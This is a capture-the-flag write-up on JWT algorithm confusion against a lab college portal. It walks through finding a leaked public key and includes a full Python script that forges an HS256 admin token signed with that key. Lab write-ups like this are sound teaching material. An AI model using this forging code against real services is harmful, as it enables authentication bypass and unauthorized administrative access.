## Title: Defeating JWT Algorithm Confusion Manually
**Author:** CTF Core Team

### 🔍 Phase 1: Reconnaissance
Upon visiting the challenge URL, we are greeted with a beautiful glassmorphism-themed login page for a College Portal. We are prompted to enter a student name. 

Entering a standard name like `student1` logs us in and sets a `session_token` cookie.
If we attempt to log in as `admin`, the application throws an error: *"Admin login via portal is disabled."*

Decoding the `session_token` cookie (via [jwt.io](https://jwt.io/)) reveals the following:

**Header:**

{
  "alg": "RS256",
  "typ": "JWT"
}
Payload:

{
  "username": "student1",
  "role": "student"
}
The server uses RS256 (RSA Signature with SHA-256). This means the server signs the token with a Private Key and verifies it using a Public Key.

Phase 2: Finding the Missing Link

To forge the token, we need to perform an Algorithm Confusion Attack. If the server doesn't force the verification algorithm to match the signing algorithm, we can change the header to HS256 (HMAC with SHA-256). In HS256, the same "secret" is used to sign and verify.
If we use the server's Public Key as the HMAC symmetric secret, the server will evaluate the token, see HS256, and use the public key string to verify the HMAC signature. It will pass!

But first, we need the Public Key.

Running a tool like ffuf or dirb for /public.key yields a custom 404 error page teasing us: "Maybe check the source codes properly instead of brute-forcing paths?"
Viewing the page source and navigating to /static/js/main.js, we find a commented-out developer note:

JavaScript
// TODO (Dev Note): 
// We shifted the public key from /public.key to a secure location.
/*
async function testKeyAccess() {
    const response = await fetch('/static/assets/pub_cert_v2_backup.pem');
...
We found the key! Accessing http://localhost:5000/static/assets/pub_cert_v2_backup.pem gives us the RSA Public Key.

Phase 3: Bypassing Modern Defenses
Normally, we could use the PyJWT library to craft our token. However, modern versions of PyJWT include a security patch: if you specify alg="HS256" but pass an asymmetric key (like our PEM string), it throws an InvalidKeyError.
To bypass this, we must become the library. We will construct the JWT manually using Python's built-in hmac, hashlib, and base64 modules.
Critical Detail: When fetching the key via requests, HTTP might return \r\n (CRLF) line endings. The backend server likely uses \n (LF) in memory. A single byte difference will ruin an HMAC signature. We must normalize the bytes.

Phase 4: The Exploit Code

import base64
import json
import hmac
import hashlib
import requests

url = "http://localhost:5000"
key_url = f"{url}/static/assets/pub_cert_v2_backup.pem"

# 1. Fetch Key (Strictly handling bytes)
raw_key = requests.get(key_url).content
public_key_bytes = raw_key.replace(b'\r\n', b'\n')

print(f"[+] Fetched Public Key! Length: {len(public_key_bytes)}")

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).replace(b'=', b'').decode('utf-8')

# 2. Forge Header & Payload
header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "admin", "role": "admin"}

header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))

unsigned_token = f"{header_b64}.{payload_b64}"

# 3. Forge HMAC Signature using the Public Key bytes
signature = hmac.new(
    public_key_bytes, 
    unsigned_token.encode('utf-8'), 
    hashlib.sha256
).digest()

signature_b64 = b64url_encode(signature)
forged_token = f"{unsigned_token}.{signature_b64}"

print(f"[+] Forged Token: {forged_token}")

# 4. Fire the Exploit
cookies = {'session_token': forged_token}
response = requests.get(f"{url}/dashboard", cookies=cookies, allow_redirects=False)

if response.status_code == 200 and "CTF{" in response.text:
    print("\n[🎉] CHALLENGE SOLVED! FLAG FOUND:")
    for line in response.text.split('\n'):
        if "CTF{" in line:
            print("     " + line.strip())
else:
    print(f"\n[-] Exploit failed. Status: {response.status_code}")
